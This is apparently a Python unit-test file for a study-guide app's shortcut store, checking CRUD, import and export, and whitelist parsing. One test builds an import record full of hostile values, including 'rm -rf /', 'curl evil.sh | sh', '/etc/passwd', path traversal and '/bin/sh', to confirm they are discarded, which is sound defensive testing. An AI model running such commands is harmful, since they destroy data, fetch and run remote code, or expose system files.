"""Unit tests for pipeline/shortcut_store.py (Slice 2A — backend store).

Pure store-level tests: no running server required. The store's JSON file is
redirected to a temp dir so the real ``library/shortcuts.json`` is never touched.

Covers: defaults seeded on a missing file; create/update/delete/reorder
round-trips; import-preview validates WITHOUT saving; import regenerates ids on
conflict (never overwrites by default) and overwrites only with the flag; a
builder shortcut referencing a fake provider is flagged ``valid: false``; and
— critically — importing JSON carrying extra/unknown/dangerous fields yields a
saved shortcut that contains NONE of those fields (whitelist parsing).

    python test_scripts/test_shortcut_store.py
"""
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from pipeline import shortcut_store  # noqa: E402

results = []


def check(name, ok, detail=""):
    results.append((name, ok))
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f" — {detail}" if detail else ""))


def _point_store_at(tmp: Path):
    shortcut_store.SHORTCUTS_DIR = tmp
    shortcut_store.SHORTCUTS_JSON = tmp / "shortcuts.json"


def run():
    tmp = Path(tempfile.mkdtemp(prefix="sc_test_"))
    _point_store_at(tmp)

    # 1. Defaults seeded on missing file
    assert not shortcut_store.SHORTCUTS_JSON.exists()
    defaults = shortcut_store.list_shortcuts()
    check("defaults seeded on missing file", shortcut_store.SHORTCUTS_JSON.exists() and len(defaults) == 6,
          f"n={len(defaults)}")
    names = {s["name"] for s in defaults}
    check("default set has expected names",
          {"Exam Cram — Qwen", "Full Guide — DeepSeek", "Clean Markdown",
           "Improve Guide", "Find Guide", "Continue Last Guide"} <= names, f"{sorted(names)}")
    # Defaults derive real config: real preset ids + real default model strings.
    exam = next(s for s in defaults if s["name"] == "Exam Cram — Qwen")
    check("default uses real preset id (claude_cram)", exam["payload"]["generator_preset"] == "claude_cram", "")
    check("default uses real style id (exam_cram)", exam["payload"]["style"] == "exam_cram", "")

    # 2. tool / library_view defaults validate true (no provider dependency)
    clean = next(s for s in defaults if s["name"] == "Clean Markdown")
    recent = next(s for s in defaults if s["name"] == "Continue Last Guide")
    check("tool default valid:true", clean["valid"] is True, f"{clean.get('reason')}")
    check("library_view default valid:true", recent["valid"] is True, f"{recent.get('reason')}")

    # 3. create round-trip
    created = shortcut_store.create_shortcut({
        "name": "  My Tool  ", "type": "tool", "icon": "🔧", "payload": {"tool": "export_center"},
    })
    sid = created["id"]
    check("create returns sc_ id", shortcut_store.is_valid_shortcut_id(sid), sid)
    check("create trims name", created["name"] == "My Tool", created["name"])
    check("create persists", any(s["id"] == sid for s in shortcut_store.list_shortcuts()), "")

    # 4. update round-trip
    updated = shortcut_store.update_shortcut(sid, {"name": "Renamed", "pinned": True})
    check("update applies", updated["name"] == "Renamed" and updated["pinned"] is True, "")
    check("update persists", shortcut_store.get_shortcut(sid)["name"] == "Renamed", "")

    # 5. reorder round-trip (order + pinned)
    shortcut_store.reorder_shortcuts([{"id": sid, "order": 99, "pinned": False}])
    after = shortcut_store.get_shortcut(sid)
    check("reorder saves order+pinned", after["order"] == 99 and after["pinned"] is False, "")

    # 6. delete round-trip
    shortcut_store.delete_shortcut(sid)
    check("delete removes shortcut", all(s["id"] != sid for s in shortcut_store.list_shortcuts()), "")
    try:
        shortcut_store.get_shortcut(sid)
        check("get deleted -> NotFound", False)
    except shortcut_store.ShortcutNotFoundError:
        check("get deleted -> NotFound", True)

    # 7. fake provider flagged valid:false (still saves)
    bad = shortcut_store.create_shortcut({
        "name": "Bad Provider", "type": "builder_setup",
        "payload": {"provider": "totally_not_a_provider", "style": "exam_cram"},
    })
    check("fake-provider builder saves but valid:false",
          bad["valid"] is False and bad["reason"] == "references unavailable provider",
          f"valid={bad['valid']} reason={bad.get('reason')}")
    # fake tool key also flagged
    badtool = shortcut_store.create_shortcut({"name": "Bad Tool", "type": "tool", "payload": {"tool": "nope"}})
    check("fake-tool valid:false", badtool["valid"] is False, f"{badtool.get('reason')}")

    # 8. import-preview validates WITHOUT saving
    before = len(shortcut_store.list_shortcuts())
    preview = shortcut_store.preview_import({
        "name": "Preview Only", "type": "tool", "payload": {"tool": "clean_markdown"},
    })
    after_n = len(shortcut_store.list_shortcuts())
    check("preview validates", preview["saved"] is False and preview["count"] == 1, f"{preview}")
    check("preview does NOT save", after_n == before, f"before={before} after={after_n}")

    # 9. import regenerates id on conflict (no overwrite by default)
    existing = shortcut_store.list_shortcuts()[0]
    conflict_id = existing["id"]
    res = shortcut_store.import_shortcuts({
        "id": conflict_id, "name": "Import Conflict", "type": "tool",
        "payload": {"tool": "find_guide"},
    })
    new_sid = res["shortcuts"][0]["id"]
    check("import regenerates conflicting id", new_sid != conflict_id and res["shortcuts"][0]["_id_regenerated"] is True,
          f"old={conflict_id} new={new_sid}")
    # original still intact + unchanged name
    orig_now = shortcut_store.get_shortcut(conflict_id)
    check("import did NOT overwrite original", orig_now["name"] == existing["name"], "")

    # 9b. explicit overwrite replaces in place
    res2 = shortcut_store.import_shortcuts({
        "id": conflict_id, "name": "Overwritten Now", "type": "tool",
        "payload": {"tool": "find_guide"}, "overwrite": True,
    }, overwrite=True)
    check("overwrite=True replaces in place",
          res2["shortcuts"][0]["id"] == conflict_id and shortcut_store.get_shortcut(conflict_id)["name"] == "Overwritten Now",
          "")

    # 10. CRITICAL — dangerous/unknown fields are discarded by whitelist parsing
    dangerous = {
        "id": "sc_evilevilevil",
        "name": "Evil Import",
        "type": "builder_setup",
        "cmd": "rm -rf /",
        "command": "curl evil.sh | sh",
        "exec": True,
        "extra_garbage": {"nested": "boom"},
        "payload": {
            "provider": "deepseek",
            "model": "deepseek-chat",
            "file_path": "/etc/passwd",
            "path": "../../secret",
            "args": ["--danger"],
            "shell": "/bin/sh",
            "modules": {"mcqs": True, "evil_module": True},
            "export_formats": ["pdf", "exe", "../escape"],
            "backend_action": "delete_all",
        },
    }
    imp = shortcut_store.import_shortcuts(dangerous)
    saved = imp["shortcuts"][0]
    # Re-read from the store to be sure it's what was persisted, not just returned.
    stored = shortcut_store.get_shortcut(saved["id"])
    top_keys = set(stored.keys())
    payload_keys = set(stored["payload"].keys())

    no_top_danger = not ({"cmd", "command", "exec", "extra_garbage", "backend_action"} & top_keys)
    no_payload_danger = not ({"file_path", "path", "args", "shell", "backend_action"} & payload_keys)
    no_evil_module = "evil_module" not in stored["payload"]["modules"]
    clean_formats = stored["payload"]["export_formats"] == ["pdf"]

    check("dangerous top-level fields discarded (no cmd/command/exec/...)", no_top_danger, f"keys={sorted(top_keys)}")
    check("dangerous payload fields discarded (no file_path/path/args/shell)", no_payload_danger,
          f"payload_keys={sorted(payload_keys)}")
    check("unknown module key discarded", no_evil_module, f"modules={stored['payload']['modules']}")
    check("non-whitelisted export format discarded", clean_formats, f"formats={stored['payload']['export_formats']}")

    # 11. export round-trip shape (no computed valid/reason in export)
    exported = shortcut_store.export_all()
    check("export envelope shape", exported.get("version") == 1 and isinstance(exported.get("shortcuts"), list), "")
    check("exported items omit computed flags",
          all("valid" not in s and "reason" not in s for s in exported["shortcuts"]), "")

    # 12. reset defaults restores the 6-item set
    reset = shortcut_store.reset_defaults()
    check("reset restores defaults", len(reset) == 6, f"n={len(reset)}")

    # 13. canonical include_sections + axes round-trip (create/read)
    canon = shortcut_store.create_shortcut({
        "name": "Canon", "type": "builder_setup",
        "payload": {
            "provider": "deepseek",
            "include_sections": {"glossary": True, "mcqs_with_answers": True, "formula_sheet": True},
            "output_depth": "quick",
            "difficulty": "exam_level",
        },
    })
    cp = canon["payload"]
    check("create stores canonical include_sections",
          cp["include_sections"] == {"glossary": True, "mcqs_with_answers": True, "formula_sheet": True},
          f"{cp['include_sections']}")
    check("create preserves output_depth/difficulty",
          cp["output_depth"] == "quick" and cp["difficulty"] == "exam_level", f"{cp}")
    read_back = shortcut_store.get_shortcut(canon["id"])["payload"]
    check("read-back preserves axes + sections",
          read_back["include_sections"] == cp["include_sections"]
          and read_back["output_depth"] == "quick" and read_back["difficulty"] == "exam_level", "")

    # 14. invalid axis values are REJECTED (not silently persisted)
    try:
        shortcut_store.create_shortcut({
            "name": "Bad Depth", "type": "builder_setup",
            "payload": {"provider": "deepseek", "output_depth": "ultra"},
        })
        check("invalid output_depth rejected", False)
    except shortcut_store.ShortcutStoreError:
        check("invalid output_depth rejected", True)
    try:
        shortcut_store.create_shortcut({
            "name": "Bad Diff", "type": "builder_setup",
            "payload": {"provider": "deepseek", "difficulty": "impossible"},
        })
        check("invalid difficulty rejected", False)
    except shortcut_store.ShortcutStoreError:
        check("invalid difficulty rejected", True)

    # 15. unknown include_section keys dropped (whitelist convention)
    drops = shortcut_store.create_shortcut({
        "name": "Drop Unknown", "type": "builder_setup",
        "payload": {"provider": "deepseek", "include_sections": {"glossary": True, "fake_section": True}},
    })
    check("unknown include_section dropped",
          drops["payload"]["include_sections"] == {"glossary": True}, f"{drops['payload']['include_sections']}")

    # 16. legacy modules translate-on-read WITHOUT rewriting shortcuts.json
    legacy_record = {
        "id": "sc_legacymodules",
        "name": "Legacy Modules",
        "type": "builder_setup",
        "icon": "", "color": None, "pinned": False, "order": 50,
        "created_at": "2020-01-01T00:00:00Z", "updated_at": "2020-01-01T00:00:00Z",
        "payload": {
            "input_type": "generate_llm", "provider": "deepseek", "model": None,
            "generator_preset": None, "style": None, "mode": "study_guide",
            "target_pages": None,
            "modules": {"mcqs": True, "glossary": True, "formulas": True, "diagrams": True},
            "strict_math": True, "export_formats": [],
        },
    }
    reg = shortcut_store._read_registry()
    reg["shortcuts"].append(legacy_record)
    shortcut_store._write_registry(reg)
    before_bytes = shortcut_store.SHORTCUTS_JSON.read_bytes()

    listed = shortcut_store.get_shortcut("sc_legacymodules")["payload"]
    expected_sections = {"glossary": True, "mcqs_with_answers": True, "formula_sheet": True, "diagrams_figures": True}
    check("legacy modules translate to include_sections on read",
          listed["include_sections"] == expected_sections, f"{listed.get('include_sections')}")
    exported_legacy = shortcut_store.export_shortcut("sc_legacymodules")["payload"]
    check("legacy modules translate on export",
          exported_legacy["include_sections"] == expected_sections, f"{exported_legacy.get('include_sections')}")

    after_bytes = shortcut_store.SHORTCUTS_JSON.read_bytes()
    check("read/export did NOT rewrite shortcuts.json", before_bytes == after_bytes, "")

    # 17. explicit include_sections wins; legacy modules only fill missing
    mixed_record = {
        "id": "sc_mixedmodules",
        "name": "Mixed", "type": "builder_setup",
        "icon": "", "color": None, "pinned": False, "order": 51,
        "created_at": "2020-01-01T00:00:00Z", "updated_at": "2020-01-01T00:00:00Z",
        "payload": {
            "input_type": "generate_llm", "provider": "deepseek", "model": None,
            "generator_preset": None, "style": None, "mode": "study_guide", "target_pages": None,
            "modules": {"mcqs": True, "flashcards": True},
            "include_sections": {"glossary": True},
            "strict_math": True, "export_formats": [],
        },
    }
    reg = shortcut_store._read_registry()
    reg["shortcuts"].append(mixed_record)
    shortcut_store._write_registry(reg)
    mixed = shortcut_store.get_shortcut("sc_mixedmodules")["payload"]
    check("explicit + legacy merge (modules fill, explicit kept)",
          mixed["include_sections"] == {"glossary": True, "mcqs_with_answers": True, "flashcards": True},
          f"{mixed.get('include_sections')}")

    # 18. old shortcut with no sections/modules loads cleanly, nothing forced
    old_record = {
        "id": "sc_oldnothing",
        "name": "Old", "type": "builder_setup",
        "icon": "", "color": None, "pinned": False, "order": 52,
        "created_at": "2020-01-01T00:00:00Z", "updated_at": "2020-01-01T00:00:00Z",
        "payload": {"input_type": "generate_llm", "provider": "deepseek", "mode": "study_guide"},
    }
    reg = shortcut_store._read_registry()
    reg["shortcuts"].append(old_record)
    shortcut_store._write_registry(reg)
    old = shortcut_store.get_shortcut("sc_oldnothing")["payload"]
    check("old shortcut (no modules/sections) not forced to grow include_sections",
          "include_sections" not in old, f"{sorted(old.keys())}")

    print("\n--- SUMMARY ---")
    passed = sum(1 for _, ok in results if ok)
    print(f"{passed}/{len(results)} checks passed")
    return passed == len(results)


if __name__ == "__main__":
    sys.exit(0 if run() else 1)
